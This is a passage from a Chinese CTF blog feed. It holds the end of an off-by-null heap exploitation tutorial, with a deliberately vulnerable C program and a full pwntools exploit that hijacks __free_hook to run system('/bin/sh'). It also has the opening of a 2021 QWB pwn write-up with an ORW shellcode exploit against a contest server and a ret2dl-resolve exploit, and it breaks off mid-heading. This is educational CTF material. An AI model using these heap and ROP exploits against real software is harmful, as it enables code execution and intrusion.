class="line"><span class="built_in">puts</span>(<span class="string">"Index?"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&gt;=<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"wrong index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!chunks[index].<span class="built_in">point</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"It's blank!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *p=chunks[index].<span class="built_in">point</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"content:"</span>);</span><br><span class="line">p[<span class="built_in">read</span>(<span class="number">0</span>,chunks[index].<span class="built_in">point</span>,chunks[index].<span class="built_in">size</span>)]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Index?"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&gt;=<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"wrong index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!chunks[index].<span class="built_in">point</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"It's blank!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(chunks[index].<span class="built_in">point</span>);</span><br><span class="line">chunks[index].<span class="built_in">point</span>=<span class="number">0</span>;</span><br><span class="line">chunks[index].<span class="built_in">size</span>=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"1) add a chunk"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"2) show content"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"3) edit a chunk"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"4) delete a chunk"</span>);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> choice;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Welcome to my off by null vuln vulnerability exercise."</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"wish you will play happy!"</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;choice);</span><br><span class="line"><span class="keyword">switch</span>(choice)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">add();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">show();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">edit();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="keyword">delete</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./text'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'Size?'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text=<span class="string">''</span>)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index?'</span>) </span><br><span class="line">    p.sendline(str(num))   </span><br><span class="line">    p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">    p.send(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index?\n'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line"> <span class="comment">#1.创造4个大于tcache的最大值并且在largebin范围内的chunk A、B、C、D。</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x450</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x450</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0x4f0</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x450</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#按照顺序释放A、C、D，形成largebins 链表。</span></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#释放chunk B，让chunk B和chunk C产生合并</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#让old chunk C的 old fd 与old bk保留在new chunk 底部。</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x470</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x430</span>)</span><br><span class="line"><span class="comment">#复原chunk</span></span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x450</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#修改chunk A bf 值为old chunk C addr。修改chunk D fd 值为old chunk C addr。</span></span><br><span class="line"><span class="comment">#(这里体现方法的一个弊端，如果`\n`不能替换‘\x00’就需要题目有show功能)</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x450</span>) <span class="comment">#bk</span></span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x430</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x450</span>) </span><br><span class="line">    edit(<span class="number">0</span>,p8(<span class="number">0</span>)*<span class="number">7</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0x500</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x450</span>)</span><br><span class="line">    show(<span class="number">5</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    fd=(u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x20</span>)</span><br><span class="line">    <span class="comment">#fd=p.recvline()</span></span><br><span class="line">    print(hex(fd))</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x438</span>)</span><br><span class="line">    edit(<span class="number">5</span>,p64(fd))</span><br><span class="line"><span class="comment">#通过new chunk B修改  old chunk C size 为fake size。通过new chunk B修改  old chunk C size 为fake size。（这里就用残留的0x460）通过new chunk C 修改隔离chunk的`prevsize`值为fake size，</span></span><br><span class="line">    edit(<span class="number">3</span>,p8(<span class="number">0</span>)*<span class="number">0x430</span>+p64(<span class="number">0x460</span>))</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">    print(hex(fd))</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x100</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    main_arena=(u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span>)</span><br><span class="line">    <span class="comment">#fd=p.recvline()</span></span><br><span class="line">    print(hex(main_arena))</span><br><span class="line">    malloc_hook=main_arena<span class="number">-0x10</span></span><br><span class="line">    x=libcfind.finder(<span class="string">'__malloc_hook'</span>,malloc_hook,num=<span class="number">5</span>)</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">[-] 0: libc6_2.15-0ubuntu10.23_amd64(source from:ubuntu-eglibc)</span></span><br><span class="line"><span class="string">[-] 1: libc6-amd64_2.30-0ubuntu2.2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 2: libc6_2.30-0ubuntu2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 3: libc6-amd64_2.31-0ubuntu9.2_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 4: libc6_2.31-0ubuntu9_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 5: local-ad9f264101ca975f82b40fffd5aa6f763cfd1ed9(source from:/usr/lib/x86_64-linux-gnu/libc-2.31.so)</span></span><br><span class="line"><span class="string">[-] 6: libc6-amd64_2.30-0ubuntu2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 7: libc6-amd64_2.31-0ubuntu9_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 8: libc6_2.31-0ubuntu9.2_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 9: libc6_2.30-0ubuntu2.2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="number">0x420</span>*p8(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x111</span>)+p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">    print(<span class="string">'ok1'</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">'/bin/sh\x00\n'</span>)</span><br><span class="line">    print(<span class="string">'ok1'</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x100</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line">    addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span></span><br><span class="line">    log.info(<span class="string">'main_arena:'</span>+hex(addr))</span><br><span class="line">    malloc_hook=addr<span class="number">-0x10</span></span><br><span class="line">    log.info(<span class="string">'malloc_hook:'</span>+hex(malloc_hook))</span><br><span class="line">    x=libcfind.finder(<span class="string">'__malloc_hook'</span>,malloc_hook,num=<span class="number">5</span>)</span><br><span class="line">    log.info(<span class="string">'base:'</span>+hex(x.libcbase))</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    multi libc results:</span></span><br><span class="line"><span class="string">[-] 0: libc6_2.15-0ubuntu10.23_amd64(source from:ubuntu-eglibc)</span></span><br><span class="line"><span class="string">[-] 1: libc6-amd64_2.30-0ubuntu2.2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 2: libc6_2.30-0ubuntu2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 3: libc6-amd64_2.31-0ubuntu9.2_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 4: libc6_2.31-0ubuntu9_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 5: local-ad9f264101ca975f82b40fffd5aa6f763cfd1ed9(source from:/usr/lib/x86_64-linux-gnu/libc-2.31.so)</span></span><br><span class="line"><span class="string">[-] 6: libc6-amd64_2.30-0ubuntu2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 7: libc6-amd64_2.31-0ubuntu9_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 8: libc6_2.31-0ubuntu9.2_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 9: libc6_2.30-0ubuntu2.2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">7</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">    print(<span class="string">'ok1'</span>)</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">9</span>,<span class="number">0x60</span>)</span><br><span class="line">    print(<span class="string">'ok2'</span>)</span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    edit(<span class="number">9</span>,p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">    print(<span class="string">'ok3'</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    print(<span class="string">'ok4'</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./text'</span>)</span><br><span class="line">pwn()</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>off by null 自从qwb被打懵后一直想了解这个知识，但又是毕业那些一大堆事情。同时tcl看了很多文章才看懂。感谢wjh爷爷和nopnoping爷爷的文章。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://nopnoping.github.io/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://nopnoping.github.io/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</a></p><p><a href="http://blog.wjhwjhn.com/archives/193/" target="_blank" rel="noopener">http://blog.wjhwjhn.com/archives/193/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;个人理解off by null 是 off by one的一种特例, off by null指我们可以控制堆块向下一个堆块溢出一个字节的数据，而该数据只能为’\x00’的情况。如果像常规off by one 是溢出任意一个字节，那么就可以修改下一个堆块的大小，而off by null则不能，它仅仅只可以将下一个堆块的inuse位置零.</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2021qwb-pwn-初赛-wp</title>
    <link href="lexsd6.github.io/2021/06/26/2021qwb%20pwn%20wp/"/>
    <id>lexsd6.github.io/2021/06/26/2021qwb%20pwn%20wp/</id>
    <published>2021-06-26T02:22:38.000Z</published>
    <updated>2021-07-28T16:21:48.203Z</updated>
    
    <content type="html"><![CDATA[<p>tcl,逆向能力薄弱的我被qwb打傻了.赛后复现时,发现好多题思路是对的.卡在了逆向反推上面.但反过来,在赛后看了很多大牛的博客后,也学习到很多知识,想这段时间忙完后单独写几篇来坐坐笔记。<a id="more"></a></p><h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><p>这道题在创建chunk时，存在有数组越界导致我们可以劫持got表，从而劫持了exit那些函数。再通过整数溢出扩大shell_code写入的范围。同时，由于execve导致我们只能通过orw（open read write）的方法读flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'39.105.131.68'</span>,<span class="number">12354</span>)</span><br><span class="line"><span class="comment">#process('./pwn2')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    <span class="comment">#p.recvuntil('content')</span></span><br><span class="line">    p.sendline(text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    <span class="comment">#p.recvuntil('index')</span></span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">-13</span>,<span class="number">0xffffffff</span>+<span class="number">1</span>,asm(<span class="string">'''</span></span><br><span class="line"><span class="string"> mov rsi, [r13+8];</span></span><br><span class="line"><span class="string"> mov rdx, 0x8;</span></span><br><span class="line"><span class="string"> mov rdi, 0x0;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x0;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> mov rsi, [r13+8];</span></span><br><span class="line"><span class="string"> mov rdx, 0x8;</span></span><br><span class="line"><span class="string"> mov rdi, 0x1;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x1;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> mov rdi, [r13+8];</span></span><br><span class="line"><span class="string"> mov rdx, 0x0;</span></span><br><span class="line"><span class="string"> mov rsi, 0x60;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x2;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> mov rsi, [r13+8];</span></span><br><span class="line"><span class="string"> mov rdx, 0x68;</span></span><br><span class="line"><span class="string"> mov rdi, 0x3;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x0;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> mov rsi, [r13+8];</span></span><br><span class="line"><span class="string"> mov rdx, 0x68;</span></span><br><span class="line"><span class="string"> mov rdi, 0x1;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x1;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> '''</span>))</span><br><span class="line"><span class="comment">#free(-6)</span></span><br><span class="line"><span class="comment">#add(1,7,'w'*0x7)</span></span><br><span class="line">print(<span class="string">'x_x'</span>)</span><br><span class="line"><span class="comment">#free(-13)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">print(<span class="string">'x_x'</span>)</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">print(<span class="string">'x_x'</span>)</span><br><span class="line">p.sendline(<span class="string">'/flag\x00'</span>)</span><br><span class="line">free(<span class="number">-6</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="no-output"><a href="#no-output" class="headerlink" title="no_output"></a>no_output</h2><p>题目有的阴间，ban了标准输出而且我IDA F5的代码又有问题识别不了libc函数（太菜了）。导致只能慢慢手撕汇编和动态gdb。通过合理覆盖，让 <code>read(3,xx,xx)</code>变为<code>read(0,xx,xx)</code>写入‘hello_boy\x00’绕过cmp。</p><p>再通过’-0x80000000/-1==0’的特性触发signal，进入栈溢出的read，ret2dl-resolve get shall.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./test'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote('39.105.138.97',1234)</span></span><br><span class="line">p=process(<span class="string">'./test'</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'\x00\x00\n'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(<span class="string">'w'</span>*(<span class="number">0x30</span><span class="number">-16</span>)+<span class="string">'hello_boy\x00\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'x'</span>*<span class="number">0x5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(str(<span class="number">-0x80000000</span>))</span><br><span class="line">p.sendline(str(<span class="number">-1</span>))</span><br><span class="line">rop = ROP(<span class="string">'./test'</span>)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(e, symbol=<span class="string">"system"</span>, args=[<span class="string">"/bin/sh"</span>]) </span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr) </span><br><span class="line">rop.ret2dlresolve(dlresolve) </span><br><span class="line">raw_rop = rop.chain() </span><br><span class="line">print(rop.dump())</span><br><span class="line">print(hex(dlresolve.data_addr))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'x'</span>*(<span class="number">0x50</span><span class="number">-4</span>)+raw_rop)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.sendline(dlresolve.payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="baby-diary"><a href="#baby-diary" class="headerlink" 